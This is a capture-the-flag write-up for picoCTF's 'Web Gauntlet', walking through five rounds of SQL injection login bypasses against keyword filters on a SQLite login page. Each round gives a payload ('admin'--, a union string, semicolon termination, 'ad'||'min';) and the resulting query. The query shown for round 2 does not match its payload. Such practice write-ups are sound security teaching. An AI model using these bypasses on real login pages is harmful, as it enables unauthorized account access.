---

title: "Web Gauntlet"  
date: "2024-10-16"  
thumbnail: "/assets/img/thumbnail/Web_Gauntlet.png"

---

# Web Gauntlet

---

**Challenges Difficulty: Medium**  
**Category: Web Exploitation**

## Introduction  
This series focuses on the fundamentals of SQL Injection vulnerability. Check out [A03:2021-Injection](https://owasp.org/www-community/attacks/SQL_Injection).

## WALKTHROUGH  
This challenge is from the picoCTF 2020 Mini-Competition.

#### Hints:
1. You are not allowed to log in with valid credentials.
2. Write down the injections you use in case you lose your progress.
3. For some filters, it may be hard to see the characters. Always (always) look at the raw hex in the response.
4. SQLite is used.
5. If your cookie keeps getting reset, try using a private browser window.

![Challenge 1](/assets/img/posts/post-2/chal.png)

The challenge gives us two links as shown above. The first one is a login page, and the second shows us what the round filters. \
## Round 1 
For the first round, it filters out **or**, so we can still use **--** to comment out the rest of the query.

---

**Username:** `admin'--`  
**Password:** anything, e.g., `123`  
Then the query should look like this:

```sql
SELECT * FROM users WHERE username='admin'-- AND password='123'
```

---
## Round 2
Now we are in round 2, and it filters out the following: **or**, **like**, **=**, and **--**.  
We shall try to use an alternative method, like **union**, to continue.

---

**Username:** `admin'union select * from users where '1;`  
**Password:** anything, e.g., `123`  
Then the query should look like this:

```sql
SELECT * FROM users WHERE username='admin'; AND password='123'
```

---
## Round 3
In round 3, it filters **or**, **=**, **like**, **>**, **<**, and **--**. We can use **;** to end the query.
In SQL, the semicolon is a statement terminator, meaning it marks the end of a SQL statement. It tells the database engine that the statement is complete and ready to be executed

---

**Username:** `admin';`  
**Password:** anything, e.g., `123`  
Then the query should look like this:

```sql
SELECT * FROM users WHERE username='admin'; AND password='123'
```

---
## Round 4
Round 4 is a little more creative as it filters out **or**, **=**, **like**, **>**, **<**, **--**, and **admin**.  
Admin?? 🙂 Don’t panic, no problem! 😅  
In SQL, the `||` operator is commonly used for string concatenation, especially in databases like SQLite. If the application’s underlying SQL query uses this operator correctly, entering `ad'||'min'` would result in the following behavior:

```sql
SELECT * FROM users WHERE username='admin';
```

And this is what we want.

---

**Username:** `ad'||'min';`  
**Password:** anything, e.g., `123`  
Then the query should look like this:

```sql
SELECT * FROM users WHERE username='admin'; AND password='123'
```

---
## Round 5
We are in the final round—good job! ✌  
In the final round, it filters **and**, **=**, **like**, **>**, **<**, **--**, **union**, and **admin**, but we will use the same method as in the previous round.

---

**Username:** `ad'||'min';`  
**Password:** anything, e.g., `123`  
Then the query should look like this:

```sql
SELECT * FROM users WHERE username='admin'; AND password='123'
```

Congrats! You won! Check out `filter.php`.  
![solution](/assets/img/posts/post-2/sol.png)

Many thanks to [onealmond](https://github.com/onealmond) as his write-up helped me a lot in solving this challenge.

---